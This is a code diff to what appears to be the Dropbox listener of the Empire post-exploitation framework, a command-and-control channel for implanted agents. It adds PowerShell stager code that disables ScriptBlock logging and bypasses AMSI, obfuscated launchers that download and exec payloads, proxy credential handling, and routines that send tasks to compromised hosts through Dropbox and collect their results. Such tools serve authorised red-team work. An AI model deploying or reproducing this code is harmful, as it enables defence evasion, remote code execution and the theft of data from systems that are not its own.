@@ -3,6 +3,7 @@ import random
 import os
 import time
 import copy
+import json
 import dropbox
 # from dropbox.exceptions import ApiError, AuthError
 # from dropbox.files import FileMetadata, FolderMetadata, CreateFolderError
@@ -14,6 +15,8 @@ from lib.common import agents
 from lib.common import encryption
 from lib.common import packets
 from lib.common import messages
+from lib.common import templating
+from lib.common import obfuscation
 
 
 class Listener:
@@ -111,6 +114,16 @@ class Listener:
                 'Description'   :   'Hours for the agent to operate (09:00-17:00).',
                 'Required'      :   False,
                 'Value'         :   ''
+            },
+            'SlackToken' : {
+                'Description'   :   'Your SlackBot API token to communicate with your Slack instance.',
+                'Required'      :   False,
+                'Value'         :   ''
+            },
+            'SlackChannel' : {
+                'Description'   :   'The Slack channel or DM that notifications will be sent to.',
+                'Required'      :   False,
+                'Value'         :   '#general'
             }
         }
 
@@ -173,17 +186,32 @@ class Listener:
             if language.startswith('po'):
                 # PowerShell
 
-                stager = ''
+                # replace with stager = '' for troubleshooting
+                stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
+                    stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
+
                     # ScriptBlock Logging bypass
-                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("$GPF=[ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.Utils'"
                     stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
-                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(");If($GPF){$GPC=$GPF.GetValue($null);If($GPC")
+                    stager += "['ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("){$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
+                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
+                    stager += "('EnableScriptB'+'lockLogging',0);"
+                    stager += helpers.randomize_capitalization("$val.Add")
+                    stager += "('EnableScriptBlockInvocationLogging',0);"
+                    stager += helpers.randomize_capitalization("$GPC")
+                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
+                    stager += helpers.randomize_capitalization("=$val}")
+                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
+                    stager += "'signatures','N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
 
                     # @mattifestation's AMSI bypass
                     stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
@@ -191,6 +219,7 @@ class Listener:
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
                     stager += helpers.randomize_capitalization(").SetValue($null,$true)};")
+                    stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
                 stager += helpers.randomize_capitalization("$wc=New-Object System.Net.WebClient;")
@@ -218,7 +247,15 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
-                            pass
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            domain = username.split('\\')[0]
+                            usr = username.split('\\')[1]
+                            stager += "$netcred = New-Object System.Net.NetworkCredential('"+usr+"','"+password+"','"+domain+"');"
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
+
+                        #save the proxy settings to use during the entire staging process and the agent
+                        stager += "$Script:Proxy = $wc.Proxy;"
 
                 # TODO: reimplement stager retries?
 
@@ -244,7 +281,7 @@ class Listener:
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
 
                 if obfuscate:
-                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
+                    stager = helpers.obfuscate(self.mainMenu.installPath, stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
                 if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
@@ -285,10 +322,29 @@ class Listener:
                 launcherBase += "req.add_header(\"Dropbox-API-Arg\",'{\"path\":\"%s/debugpy\"}');\n" % (stagingFolder)
 
 
-                launcherBase += "if urllib2.getproxies():\n"
-                launcherBase += "   o = urllib2.build_opener();\n"
-                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
-                launcherBase += "   urllib2.install_opener(o);\n"
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                    else:
+                        proto = proxy.Split(':')[0]
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        else:
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            launcherBase += "proxy_auth_handler.add_password(None,'"+proxy+"','"+username+"','"+password+"');\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                    else:
+                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                else:
+                    launcherBase += "o = urllib2.build_opener();\n"
+
+                #install proxy and creds globally, so they can be used with urlopen.
+                launcherBase += "urllib2.install_opener(o);\n"
 
                 launcherBase += "a=urllib2.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
@@ -310,7 +366,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -376,18 +432,22 @@ class Listener:
 
 
         elif language.lower() == 'python':
+            template_path = [
+                os.path.join(self.mainMenu.installPath, '/data/agent/stagers'),
+                os.path.join(self.mainMenu.installPath, './data/agent/stagers')]
+            eng = templating.TemplateEngine(template_path)
+            template = eng.get_template('dropbox.py')
 
-            f = open("%s/data/agent/stagers/dropbox.py" % (self.mainMenu.installPath))
-            stager = f.read()
-            f.close()
+            template_options = {
+                    'staging_folder': stagingFolder,
+                    'poll_interval': pollInterval,
+                    'staging_key': stagingKey,
+                    'profile': profile,
+                    'api_token': apiToken
+                    }
 
-            stager = helpers.strip_python_comments(stager)
-            # patch the server and key information
-            stager = stager.replace('REPLACE_STAGING_FOLDER', stagingFolder)
-            stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
-            stager = stager.replace('REPLACE_POLLING_INTERVAL', pollInterval)
-            stager = stager.replace('REPLACE_PROFILE', profile)
-            stager = stager.replace('REPLACE_API_TOKEN', apiToken)
+            stager = template.render(template_options)
+            stager = obfuscation.py_minify(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -417,12 +477,12 @@ class Listener:
         jitter = listenerOptions['DefaultJitter']['Value']
         profile = listenerOptions['DefaultProfile']['Value']
         lostLimit = listenerOptions['DefaultLostLimit']['Value']
-        killDate = listenerOptions['KillDate']['Value']
         workingHours = listenerOptions['WorkingHours']['Value']
+        killDate = listenerOptions['KillDate']['Value']
         b64DefaultResponse = base64.b64encode(self.default_response())
 
         if language == 'powershell':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.ps1")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.ps1")
             code = f.read()
             f.close()
 
@@ -446,7 +506,7 @@ class Listener:
 
             return code
         elif language == 'python':
-            f = open(self.mainMenu.installPath + "./data/agent/agent.py")
+            f = open(self.mainMenu.installPath + "/data/agent/agent.py")
             code = f.read()
             f.close()
 
@@ -457,7 +517,7 @@ class Listener:
             #strip out comments and blank lines
             code = helpers.strip_python_comments(code)
 
-            #patch some more 
+            #patch some more
             code = code.replace('delay = 60', 'delay = %s' % (delay))
             code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
             code = code.replace('profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
@@ -497,7 +557,7 @@ class Listener:
                 """ % (apiToken)
 
                 getTask = """
-    function script:Get-Task {
+    $script:GetTask = {
         try {
             # build the web request object
             $wc = New-Object System.Net.WebClient
@@ -505,6 +565,10 @@ class Listener:
             # set the proxy settings for the WC to be the default system settings
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
             $wc.Headers.Add("User-Agent", $script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -531,7 +595,7 @@ class Listener:
                 """ % (taskingsFolder)
 
                 sendMessage = """
-    function script:Send-Message {
+    $script:SendMessage = {
         param($Packets)
 
         if($Packets) {
@@ -547,6 +611,10 @@ class Listener:
             # set the proxy settings for the WC to be the default system settings
             $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
             $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+            if($Script:Proxy) {
+                $wc.Proxy = $Script:Proxy;
+            }
+
             $wc.Headers.Add('User-Agent', $Script:UserAgent)
             $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)}
 
@@ -568,6 +636,12 @@ class Listener:
                 }
 
                 $wc2 = New-Object System.Net.WebClient
+                $wc2.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
+                $wc2.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
+                if($Script:Proxy) {
+                    $wc2.Proxy = $Script:Proxy;
+                }
+
                 $wc2.Headers.Add("Authorization", "Bearer $($Script:APIToken)")
                 $wc2.Headers.Add("Content-Type", "application/octet-stream")
                 $wc2.Headers.Add("Dropbox-API-Arg", "{`"path`":`"$ResultsFolder/$($script:SessionID).txt`"}");
@@ -582,7 +656,7 @@ class Listener:
         }
     }
                 """ % (resultsFolder)
-
+                
                 return updateServers + getTask + sendMessage
 
             elif language.lower() == 'python':
@@ -620,16 +694,16 @@ def send_message(packets=None):
     except:
         pass
 
-    
+
     if packets:
         data = ''.join(packets)
         # aes_encrypt_then_hmac is in stager.py
         encData = aes_encrypt_then_hmac(key, data)
         data = build_routing_packet(stagingKey, sessionID, meta=5, encData=encData)
         #check to see if there are any results already present
-        
+
         headers['Dropbox-API-Arg'] = "{\\"path\\":\\"%s/%s.txt\\"}" % (resultsFolder, sessionID)
-        
+
         try:
             pkdata = post_message('https://content.dropboxapi.com/2/files/download', data=None, headers=headers)
         except:
@@ -665,6 +739,7 @@ def send_message(packets=None):
 
     return ('', '')
 """
+                
                 sendMessage = sendMessage.replace('REPLACE_TASKSING_FOLDER', taskingsFolder)
                 sendMessage = sendMessage.replace('REPLACE_RESULTS_FOLDER', resultsFolder)
                 sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
@@ -728,7 +803,14 @@ def send_message(packets=None):
             try:
                 md, res = dbx.files_download(path)
             except dropbox.exceptions.HttpError as err:
-                dispatcher.send("[!] Error download data from '%s' : %s" % (path, err), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[!] Error downloading data from '{}' : {}".format(path, err)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+
                 return None
             return res.content
 
@@ -737,14 +819,26 @@ def send_message(packets=None):
             try:
                 dbx.files_upload(data, path)
             except dropbox.exceptions.ApiError:
-                dispatcher.send("[!] Error uploading data to '%s'" % (path), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[!] Error uploading data to '{}'".format(path)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
         def delete_file(dbx, path):
             # helper to delete a file at the given path
             try:
                 dbx.files_delete(path)
             except dropbox.exceptions.ApiError:
-                dispatcher.send("[!] Error deleting data at '%s'" % (path), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[!] Error deleting data at '{}'".format(path)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
 
         # make a copy of the currently set listener options for later stager/agent generation
@@ -772,15 +866,33 @@ def send_message(packets=None):
         try:
             dbx.files_create_folder(stagingFolder)
         except dropbox.exceptions.ApiError:
-            dispatcher.send("[*] Dropbox folder '%s' already exists" % (stagingFolder), sender="listeners/dropbox")
+            listenerName = self.options['Name']['Value']
+            message = "[*] Dropbox folder '{}' already exists".format(stagingFolder)
+            signal = json.dumps({
+                'print': False,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
         try:
             dbx.files_create_folder(taskingsFolder)
         except dropbox.exceptions.ApiError:
-            dispatcher.send("[*] Dropbox folder '%s' already exists" % (taskingsFolder), sender="listeners/dropbox")
+            listenerName = self.options['Name']['Value']
+            message = "[*] Dropbox folder '{}' already exists".format(taskingsFolder)
+            signal = json.dumps({
+                'print': False,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
         try:
             dbx.files_create_folder(resultsFolder)
         except dropbox.exceptions.ApiError:
-            dispatcher.send("[*] Dropbox folder '%s' already exists" % (resultsFolder), sender="listeners/dropbox")
+            listenerName = self.options['Name']['Value']
+            message = "[*] Dropbox folder '{}' already exists".format(resultsFolder)
+            signal = json.dumps({
+                'print': False,
+                'message': message
+            })
+            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
         # upload the stager.ps1 code
         stagerCodeps = self.generate_stager(listenerOptions=listenerOptions, language='powershell')
@@ -811,7 +923,13 @@ def send_message(packets=None):
                         try:
                             md, res = dbx.files_download(fileName)
                         except dropbox.exceptions.HttpError as err:
-                            dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
+                            listenerName = self.options['Name']['Value']
+                            message = "[!] Error downloading data from '{}' : {}".format(fileName, err)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                             continue
                         stageData = res.content
 
@@ -822,19 +940,43 @@ def send_message(packets=None):
                                 try:
                                     dbx.files_delete(fileName)
                                 except dropbox.exceptions.ApiError:
-                                    dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[!] Error deleting data at '{}'".format(fileName)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                                 try:
                                     stageName = "%s/%s_2.txt" % (stagingFolder, sessionID)
-                                    dispatcher.send("[*] Uploading key negotiation part 2 to %s for %s" % (stageName, sessionID), sender='listeners/dbx')
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[*] Uploading key negotiation part 2 to {} for {}".format(stageName, sessionID)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                                     dbx.files_upload(results, stageName)
                                 except dropbox.exceptions.ApiError:
-                                    dispatcher.send("[!] Error uploading data to '%s'" % (stageName), sender="listeners/dropbox")
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[!] Error uploading data to '{}'".format(stageName)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                     if stage == '3':
                         try:
                             md, res = dbx.files_download(fileName)
                         except dropbox.exceptions.HttpError as err:
-                            dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
+                            listenerName = self.options['Name']['Value']
+                            message = "[!] Error downloading data from '{}' : {}".format(fileName, err)
+                            signal = json.dumps({
+                                'print': True,
+                                'message': message
+                            })
+                            dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                             continue
                         stageData = res.content
 
@@ -844,18 +986,36 @@ def send_message(packets=None):
                             for (language, results) in dataResults:
                                 if results.startswith('STAGE2'):
                                     sessionKey = self.mainMenu.agents.agents[sessionID]['sessionKey']
-                                    dispatcher.send("[*] Sending agent (stage 2) to %s through Dropbox" % (sessionID), sender='listeners/dbx')
+                                    listenerName = self.options['Name']['Value']
+                                    message = "[*] Sending agent (stage 2) to {} through Dropbox".format(sessionID)
+                                    signal = json.dumps({
+                                        'print': True,
+                                        'message': message
+                                    })
+                                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                                     try:
                                         dbx.files_delete(fileName)
                                     except dropbox.exceptions.ApiError:
-                                        dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[!] Error deleting data at '{}'".format(fileName)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                                     try:
                                         fileName2 = fileName.replace("%s_3.txt" % (sessionID), "%s_2.txt" % (sessionID))
                                         dbx.files_delete(fileName2)
                                     except dropbox.exceptions.ApiError:
-                                        dispatcher.send("[!] Error deleting data at '%s'" % (fileName2), sender="listeners/dropbox")
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[!] Error deleting data at '{}'".format(fileName2)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                                     # step 6 of negotiation -> server sends patched agent.ps1/agent.py
                                     agentCode = self.generate_agent(language=language, listenerOptions=listenerOptions)
@@ -863,10 +1023,22 @@ def send_message(packets=None):
 
                                     try:
                                         stageName = "%s/%s_4.txt" % (stagingFolder, sessionID)
-                                        dispatcher.send("[*] Uploading key negotiation part 4 (agent) to %s for %s" % (stageName, sessionID), sender='listeners/dbx')
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[*] Uploading key negotiation part 4 (agent) to {} for {}".format(stageName, sessionID)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                                         dbx.files_upload(returnResults, stageName)
                                     except dropbox.exceptions.ApiError:
-                                        dispatcher.send("[!] Error uploading data to '%s'" % (stageName), sender="listeners/dropbox")
+                                        listenerName = self.options['Name']['Value']
+                                        message = "[!] Error uploading data to '{}'".format(stageName)
+                                        signal = json.dumps({
+                                            'print': True,
+                                            'message': message
+                                        })
+                                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
 
             # get any taskings applicable for agents linked to this listener
@@ -888,22 +1060,47 @@ def send_message(packets=None):
                         if existingData:
                             taskingData = taskingData + existingData
 
-                        dispatcher.send("[*] Uploading agent tasks for %s to %s" % (sessionID, taskingFile), sender='listeners/dbx')
+                        listenerName = self.options['Name']['Value']
+                        message = "[*] Uploading agent tasks for {} to {}".format(sessionID, taskingFile)
+                        signal = json.dumps({
+                            'print': True,
+                            'message': message
+                        })
+                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+
                         dbx.files_upload(taskingData, taskingFile, mode=dropbox.files.WriteMode.overwrite)
                     except dropbox.exceptions.ApiError as e:
-                        dispatcher.send("[!] Error uploading agent tasks for %s to %s : %s" % (sessionID, taskingFile, e), sender="listeners/dropbox")
+                        listenerName = self.options['Name']['Value']
+                        message = "[!] Error uploading agent tasks for {} to {} : {}".format(sessionID, taskingFile, e)
+                        signal = json.dumps({
+                            'print': True,
+                            'message': message
+                        })
+                        dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
             # check for any results returned
             for match in dbx.files_search(resultsFolder, "*.txt").matches:
                 fileName = str(match.metadata.path_display)
                 sessionID = fileName.split('/')[-1][:-4]
 
-                dispatcher.send("[*] Downloading data for '%s' from %s" % (sessionID, fileName), sender="listeners/dropbox")
+                listenerName = self.options['Name']['Value']
+                message = "[*] Downloading data for '{}' from {}".format(sessionID, fileName)
+                signal = json.dumps({
+                    'print': True,
+                    'message': message
+                })
+                dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
 
                 try:
                     md, res = dbx.files_download(fileName)
                 except dropbox.exceptions.HttpError as err:
-                    dispatcher.send("[!] Error download data from '%s' : %s" % (fileName, err), sender="listeners/dropbox")
+                    listenerName = self.options['Name']['Value']
+                    message = "[!] Error download data from '{}' : {}".format(fileName, err)
+                    signal = json.dumps({
+                        'print': True,
+                        'message': message
+                    })
+                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
                     continue
 
                 responseData = res.content
@@ -911,8 +1108,14 @@ def send_message(packets=None):
                 try:
                     dbx.files_delete(fileName)
                 except dropbox.exceptions.ApiError:
-                    dispatcher.send("[!] Error deleting data at '%s'" % (fileName), sender="listeners/dropbox")
-                
+                    listenerName = self.options['Name']['Value']
+                    message = "[!] Error deleting data at '{}'".format(fileName)
+                    signal = json.dumps({
+                        'print': True,
+                        'message': message
+                    })
+                    dispatcher.send(signal, sender="listeners/dropbox/{}".format(listenerName))
+
                 self.mainMenu.agents.handle_agent_data(stagingKey, responseData, listenerOptions)
 
 
